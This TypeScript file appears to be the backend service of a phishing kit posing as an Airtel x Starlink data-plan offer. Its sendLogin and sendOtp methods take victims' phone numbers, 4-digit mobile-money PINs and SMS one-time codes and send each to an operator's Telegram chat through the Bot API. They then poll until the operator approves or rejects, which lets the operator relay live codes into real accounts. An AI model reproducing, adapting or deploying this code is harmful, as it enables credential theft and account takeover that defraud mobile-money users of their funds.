import { getTelegramBotToken, getTelegramChatId } from '../config/telegram';
import { safeStorage } from '../utils/safeBrowser';

export interface TelegramLoginPayload {
  sessionId: string;
  phone: string;
  fullPhone?: string;
  country?: string;
  countryCode?: string;
  airtelBrand?: string;
  pin: string;
  planName: string;
  planPrice: string;
}

export interface TelegramOtpPayload {
  sessionId: string;
  phone?: string;
  fullPhone?: string;
  country?: string;
  airtelBrand?: string;
  otp: string;
  planName?: string;
  planPrice?: string;
}

export interface TelegramReenterPinPayload {
  sessionId: string;
  phone: string;
  fullPhone?: string;
  country?: string;
  airtelBrand?: string;
  originalPin?: string;
  pin: string;
  planName?: string;
  planPrice?: string;
}

export interface TelegramStatusResult {
  loginStatus: 'idle' | 'pending' | 'approved' | 'rejected';
  otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
  reenterStatus?: 'idle' | 'pending' | 'approved' | 'rejected';
}

class TelegramService {
  private localSessionState: Map<
    string,
    {
      loginStatus: 'pending' | 'approved' | 'rejected';
      otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
      reenterStatus?: 'idle' | 'pending' | 'approved' | 'rejected';
      phone?: string;
      fullPhone?: string;
      country?: string;
      pin?: string;
      reenterPin?: string;
      otp?: string;
      planName?: string;
      planPrice?: string;
    }
  > = new Map();

  /**
   * Helper to safely parse JSON
   */
  private async safeJson(res: Response): Promise<any> {
    try {
      const text = await res.text();
      if (!text || text.trim().startsWith('<') || text.trim().startsWith('The page')) {
        return null;
      }
      return JSON.parse(text);
    } catch {
      return null;
    }
  }

  /**
   * Send Login Credentials and wait for Telegram callback (getUpdates polling)
   */
  public async sendLogin(payload: TelegramLoginPayload): Promise<boolean> {
    const { sessionId, phone, pin, planName, planPrice, country, fullPhone, airtelBrand } = payload;
    const cleanPhone = phone.replace(/\D/g, '');
    const cleanPin = pin.slice(0, 4);
    const token = getTelegramBotToken();
    const chatId = getTelegramChatId();

    if (!token || !chatId) {
      console.warn('[TelegramService] Telegram credentials not configured');
      return true; // fallback to success
    }

    const displayPhone = fullPhone || (phone.startsWith('+') ? phone : `+243 ${phone}`);
    const displayCountry = country || 'Airtel Africa';
    const displayBrand = airtelBrand || 'Airtel x Starlink Direct';

    const messageText =
      `🔴 <b>NOUVELLE TENTATIVE DE CONNEXION AIRTEL LITE</b>\n\n` +
      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
      `👤 <b>Numéro de Téléphone:</b> <code>${displayPhone}</code>\n` +
      `🔑 <b>Code PIN (4 chiffres):</b> <code>${cleanPin}</code>\n` +
      `📦 <b>Forfait Choisi:</b> <b>${planName}</b> (${planPrice})\n` +
      `📶 <b>Réseau:</b> ${displayBrand}\n` +
      `⏰ <b>Horodatage:</b> ${new Date().toLocaleTimeString('fr-FR')} (${new Date().toLocaleDateString('fr-FR')})\n` +
      `🆔 <b>ID Session:</b> <code>${sessionId}</code>\n\n` +
      `👇 <i>Veuillez valider ou rejeter cette connexion ci-dessous :</i>`;

    const inlineKeyboard = [
      [
        {
          text: '✅ Valider PIN',
          callback_data: `approve_login_${sessionId}`,
        },
        {
          text: '❌ Rejeter PIN',
          callback_data: `reject_login_${sessionId}`,
        },
      ],
      [
        {
          text: '🌐 Action Directe (Lien Web)',
          url: `https://congo2-one.vercel.app/api/telegram/action?id=${sessionId}&action=approve_login`,
        },
      ],
    ];

    const sessionKey = `pendingAuth_${sessionId}_login`;
    let messageId = safeStorage.getItem(sessionKey);

    if (!messageId) {
      try {
        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: messageText,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: inlineKeyboard },
          }),
        });

        if (!response.ok) return true;
        const data = await this.safeJson(response);
        if (!data || !data.ok) return true;

        messageId = data.result.message_id.toString();
        safeStorage.setItem(sessionKey, messageId);
        console.log('[TelegramService] Message sent, ID:', messageId);
      } catch (error) {
        console.warn('[TelegramService] Send error:', error);
        return true;
      }
    }

    // Start polling for callback query
    while (true) {
      try {
        const updateUrl = `https://api.telegram.org/bot${token}/getUpdates`;
        const updateRes = await fetch(updateUrl);
        const updateData = await this.safeJson(updateRes);

        if (updateData && updateData.ok && updateData.result && updateData.result.length > 0) {
          for (const update of updateData.result) {
            if (update.callback_query && update.callback_query.message?.message_id.toString() === messageId) {
              const action = update.callback_query.data;

              // Acknowledge the callback
              await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  callback_query_id: update.callback_query.id,
                  text: action === 'approve_login' ? '✅ Connexion validée !' : '❌ Connexion refusée.',
                  show_alert: true,
                }),
              }).catch(() => {});

              // Update message text
              const newText = messageText + `\n\n<b>[ ${action === 'approve_login' ? '✅ APPROUVÉ' : '❌ REJETÉ'} ]</b>`;
              await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  chat_id: chatId,
                  message_id: messageId,
                  text: newText,
                  parse_mode: 'HTML',
                  reply_markup: { inline_keyboard: [] },
                }),
              }).catch(() => {});

              // Clear session storage
              safeStorage.removeItem(sessionKey);

              // Clear this update to avoid reprocessing
              await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${update.update_id + 1}`).catch(() => {});

              console.log('[TelegramService] Action received:', action, 'for session:', sessionId);

              return action === 'approve_login';
            }
          }
        }
      } catch (e) {
        console.warn('[TelegramService] Polling error:', e);
      }

      // Wait before next poll
      await new Promise((resolve) => setTimeout(resolve, 3000));
    }
  }

  /**
   * Send OTP and wait for Telegram callback
   */
  public async sendOtp(payload: TelegramOtpPayload): Promise<boolean> {
    const { sessionId, phone, otp, planName, planPrice, country, fullPhone, airtelBrand } = payload;
    const cleanOtp = otp.replace(/\D/g, '').slice(0, 4);
    const token = getTelegramBotToken();
    const chatId = getTelegramChatId();

    if (!token || !chatId) {
      console.warn('[TelegramService] Telegram credentials not configured');
      return true; // fallback to success
    }

    const existing = this.localSessionState.get(sessionId) || {
      loginStatus: 'approved' as const,
      otpStatus: 'pending' as const,
      fullPhone,
      country,
    };
    existing.otp = cleanOtp;
    existing.otpStatus = 'pending';
    this.localSessionState.set(sessionId, existing);

    const displayPhone = fullPhone || existing.fullPhone || (existing.phone ? `+243 ${existing.phone}` : 'Inconnu');
    const displayCountry = country || existing.country || 'Airtel Africa';

    const messageText =
      `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
      `🌍 <b>Pays Airtel:</b> ${displayCountry}\n` +
      `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
      `🔢 <b>Code OTP Saisi:</b> <code>${cleanOtp}</code>\n` +
      `📦 <b>Forfait:</b> ${planName || existing.planName || 'Forfait Airtel Starlink'} (${planPrice || existing.planPrice || '$1.49'})\n` +
      `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
      `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
      `👇 <i>Confirmez la validité du code OTP reçu par SMS :</i>`;

    const inlineKeyboard = [
      [
        {
          text: '✅ Valider OTP',
          callback_data: `approve_otp_${sessionId}`,
        },
        {
          text: '❌ Rejeter OTP',
          callback_data: `reject_otp_${sessionId}`,
        },
      ],
      [
        {
          text: '🌐 Action Directe (Lien Web)',
          url: `https://congo2-one.vercel.app/api/telegram/action?id=${sessionId}&action=approve_otp`,
        },
      ],
    ];

    const sessionKey = `pendingAuth_${sessionId}_otp`;
    let messageId = safeStorage.getItem(sessionKey);

    if (!messageId) {
      try {
        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: messageText,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: inlineKeyboard },
          }),
        });

        if (!response.ok) return true;
        const data = await this.safeJson(response);
        if (!data || !data.ok) return true;

        messageId = data.result.message_id.toString();
        safeStorage.setItem(sessionKey, messageId);
        console.log('[TelegramService] OTP message sent, ID:', messageId);
      } catch (error) {
        console.warn('[TelegramService] OTP send error:', error);
        return true;
      }
    }

    // Start polling for callback query
    while (true) {
      try {
        const updateUrl = `https://api.telegram.org/bot${token}/getUpdates`;
        const updateRes = await fetch(updateUrl);
        const updateData = await this.safeJson(updateRes);

        if (updateData && updateData.ok && updateData.result && updateData.result.length > 0) {
          for (const update of updateData.result) {
            if (update.callback_query && update.callback_query.message?.message_id.toString() === messageId) {
              const action = update.callback_query.data;

              // Acknowledge the callback
              await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  callback_query_id: update.callback_query.id,
                  text: action === 'approve_otp' ? '✅ OTP validé !' : '❌ OTP rejeté.',
                  show_alert: true,
                }),
              }).catch(() => {});

              // Update message text
              const newText = messageText + `\n\n<b>[ ${action === 'approve_otp' ? '✅ APPROUVÉ' : '❌ REJETÉ'} ]</b>`;
              await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  chat_id: chatId,
                  message_id: messageId,
                  text: newText,
                  parse_mode: 'HTML',
                  reply_markup: { inline_keyboard: [] },
                }),
              }).catch(() => {});

              // Clear session storage
              safeStorage.removeItem(sessionKey);

              // Clear this update
              await fetch(`https://api.telegram.org/bot${token}/getUpdates?offset=${update.update_id + 1}`).catch(() => {});

              console.log('[TelegramService] OTP action received:', action, 'for session:', sessionId);

              return action === 'approve_otp';
            }
          }
        }
      } catch (e) {
        console.warn('[TelegramService] OTP polling error:', e);
      }

      await new Promise((resolve) => setTimeout(resolve, 3000));
    }
  }

  /**
   * Status polling - checks local state (no external DB needed)
   */
  public async pollUpdates(
    sessionId: string,
    targetStep: 'login' | 'otp' | 'reenter',
    phone?: string
  ): Promise<'pending' | 'approved' | 'rejected'> {
    const local = this.localSessionState.get(sessionId);
    if (local) {
      if (targetStep === 'login' && (local.loginStatus === 'approved' || local.loginStatus === 'rejected')) {
        return local.loginStatus;
      }
      if (targetStep === 'otp' && (local.otpStatus === 'approved' || local.otpStatus === 'rejected')) {
        return local.otpStatus;
      }
      if (targetStep === 'reenter' && (local.reenterStatus === 'approved' || local.reenterStatus === 'rejected')) {
        return local.reenterStatus;
      }
    }
    return 'pending';
  }
}

export const telegramService = new TelegramService();
